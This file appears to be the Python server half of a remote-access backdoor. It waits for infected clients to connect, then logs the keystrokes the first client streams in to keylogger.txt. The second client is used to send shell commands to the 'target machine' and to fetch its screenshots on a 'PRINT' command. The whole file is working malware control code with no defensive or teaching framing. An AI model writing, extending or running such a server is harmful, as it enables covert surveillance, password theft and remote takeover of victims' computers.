import socket
import sys
import threading
import os

def receive_prt_sc(client, n):
    # CHANGE THE SCREENSHOT'S NAME
    screenshot = 'screenshot-' + str(n) + ".jpg"  
    with open(screenshot, 'wb') as file:
        while True:
            # RECEIVE AND WRITE SCREENSHOT
            data = client.recv(1024)
            if not data:
                break
            if b'END_FILE' in data:
                break
            file.write(data)


def handle_print_screen(client):
    print("[+] 'PRINT' to take a target's screenshot")
    print("[+] Any other commands will be executed directly in the target machine's shell\n")
    n = 0
    while True:
        while True:
            # RECEIVE HACKER'S INPUT
            request = input()
            # SEND TO CLIENT TO MATCH COMMANDS
            client.send(request.encode('utf-8'))
            # PRINT SOLICITATION
            if request == 'PRINT':
                receive_prt_sc(client, n)
                n += 1
            elif request == 'EXIT':
                break

        # CLEANS UP
        os.system("rm img.jpg")
        client.close()
        
def handle_keylogger(client):
    print("[+] Receiving the keylogger from client each 10 seconds")
    # WRITE KEYLOGGER BACKDOOR
    with open('keylogger.txt', 'wb') as arquivo:
        while True:
            data = client.recv(1024)  
            # CONNECTION IS OVER
            if not data:
                break
            # PRINT ONLY IF THERE IS MESSAGE
            if data != '':
                print("[+] Backdoor target wrote:\n→ ", data.decode('utf-8'))
            arquivo.write(data)

    # CLOSE CONNECTION WITH CLIENT
    client.close()
        
    print(f"\n[+] Client keylogger disconnected. The file was received and saved as keylogger.txt")


def handle_clients(client, id):
    # FIRST TO CONNECT: KEYLOGGER
    KEYLOGGER = 0
    
    # SECOND TO CONNECT: PRINTSCREEN
    PRINTSCREEN = 1

    if id == KEYLOGGER:
        handle_keylogger(client)
    elif id == PRINTSCREEN:
        handle_print_screen(client)
    else:
        print('[-] There is no function for this client')


# CREATE A SERVER, RECEIVE BACKDOOR FROM CLIENT
def server_init(server_address, port_address):
    # CREATE SERVER SOCKET
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # ASSOCIATE SOCKET WITH AN ADRRESS AND PORT
    server.bind((server_address, port_address))

    # PUT SOCKET TO LISTEN
    server.listen()
    print(f"[+] Server listening on {server_address}:{port_address}")
    print("...WAITING...")
    
    # CLIENT'S ID
    client_id = 0

    while True:
        # WAIT TO CLIENT CONNECT
        client, client_address = server.accept()
        print(f"[+] Client {client_address} connected")

        # START THREAD CLIENT 
        client_thread = threading.Thread(target=handle_clients, args=(client, client_id))
        client_thread.start()

        # INCREASE ID
        client_id += 1

# EXECUTE PROGRAM
if __name__ == '__main__':
    # GET THE IP  AND PORT FROM TERMINAL
    server_address = sys.argv[1] 
    port_address = int(sys.argv[2])

    server_init(server_address, port_address)
